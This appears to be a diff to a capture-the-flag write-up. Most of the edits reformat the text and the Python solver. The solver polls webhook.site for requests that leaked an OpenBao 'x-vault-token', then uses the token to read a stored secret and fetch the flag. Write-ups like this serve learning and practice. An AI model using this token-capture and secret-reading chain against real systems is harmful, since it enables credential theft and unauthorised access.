@@ -49,16 +49,17 @@ But we don't have Nabi's OpenBao token yet.
 
 ![alt text](si.jpg)
 
-So the rough plan became:-
-
 Get access to OpenBao
-    ↓
+
+↓
 
 Read secret/data/flag
-    ↓
+
+↓
 
 Get FLAG_API_KEY
-    ↓
+
+↓
 
 Use it on the flag service
 
@@ -133,7 +134,7 @@ Now we have finally have Nabi's OpenBao token.
 
 From the `config.hcl`, we know that Nabi's token can read:
 
-secret/data/+
+``secret/data/+``
 
 
 Now we can just use the OpenBao token we have to read `secret/data/flag`.
@@ -195,9 +196,7 @@ requests.post(
 )
 
 while True:
-    r = requests.get(
-        f"https://webhook.site/token/{webhook}/requests"
-    ).json()
+    r = requests.get(f"https://webhook.site/token/{webhook}/requests").json()
 
     for req in r["data"]:
         token = req["headers"].get("x-vault-token")
@@ -210,17 +209,9 @@ while True:
 
     time.sleep(1)
 
-key = requests.get(
-    f"{bao}/v1/secret/data/flag",
-    headers={"X-Vault-Token": token[0]}
-).json()["data"]["data"]["FLAG_API_KEY"]
+key = requests.get(f"{bao}/v1/secret/data/flag",headers={"X-Vault-Token": token[0]}).json()["data"]["data"]["FLAG_API_KEY"]
 
-print(
-    requests.get(
-        flag,
-        headers={"x-api-token": key}
-    ).text
-)
+print(requests.get(flag,headers={"x-api-token": key}).text)
 ```
 
 ## tl;dr
